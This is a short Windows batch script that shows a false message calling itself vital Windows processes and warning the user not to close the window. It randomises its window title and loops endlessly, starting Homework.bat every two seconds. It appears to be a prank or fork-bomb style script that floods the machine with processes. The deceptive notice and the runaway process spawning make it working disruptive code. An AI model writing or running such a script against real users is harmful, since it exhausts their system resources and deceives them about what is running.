@echo off
color 0a
echo Starting Vital windows Processes, DO NOT CLOSE THIS WINDOW.
pushd "%~dp0"
:a
title win%random%a
timeout /t 2 /nobreak >nul
start Homework.bat
goto a